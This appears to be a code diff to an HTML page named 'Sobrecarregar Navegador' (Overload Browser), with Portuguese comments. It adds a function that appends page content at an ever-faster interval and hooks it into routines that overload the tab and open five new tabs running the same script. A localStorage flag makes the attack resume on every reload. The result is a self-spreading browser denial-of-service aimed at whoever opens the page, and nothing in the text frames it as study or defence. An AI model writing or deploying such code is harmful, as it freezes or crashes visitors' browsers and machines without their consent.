@@ -4,6 +4,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sobrecarregar Navegador</title>
+    <style>
+        .content {
+            margin: 10px;
+            padding: 10px;
+            border: 1px solid #ccc;
+        }
+    </style>
     <script>
         // Função para sobrecarregar o navegador
         function overload() {
@@ -24,17 +31,44 @@
             }
         }
 
+        // Função para criar conteúdo dinâmico
+        function createContent() {
+            const contentDiv = document.createElement('div');
+            contentDiv.classList.add('content');
+            contentDiv.innerHTML = `
+                <h2>Conteúdo Gerado</h2>
+                <p>Este é um conteúdo gerado dinamicamente para sobrecarregar o navegador.</p>
+            `;
+            document.body.appendChild(contentDiv);
+        }
+
+        // Função para iniciar a sobrecarga
+        function startOverload() {
+            let interval = 9900; // Intervalo inicial de 9,9 segundos em milissegundos
+
+            // Função para multiplicar o conteúdo
+            function multiplyContent() {
+                createContent();
+                setTimeout(multiplyContent, interval);
+                interval = Math.max(100, interval - 100); // Diminui o intervalo em 100ms, com mínimo de 100ms
+            }
+
+            multiplyContent();
+        }
+
         // Verifica se a sobrecarga já foi iniciada
         function checkOverloadStatus() {
             if (localStorage.getItem('overloadStarted') === 'true') {
                 overload(); // Começa a sobrecarga automaticamente
                 openAndOverload(); // Abre 5 novas abas com o script de sobrecarga
+                startOverload(); // Começa a multiplicação do conteúdo
             } else {
                 // Inicia a sobrecarga após 4 segundos
                 setTimeout(function() {
                     localStorage.setItem('overloadStarted', 'true'); // Marca que a sobrecarga foi iniciada
                     overload(); // Começa a sobrecarga na aba atual
                     openAndOverload(); // Abre 5 novas abas com o script de sobrecarga
+                    startOverload(); // Começa a multiplicação do conteúdo
                 }, 4000); // Atraso de 4 segundos
             }
         }
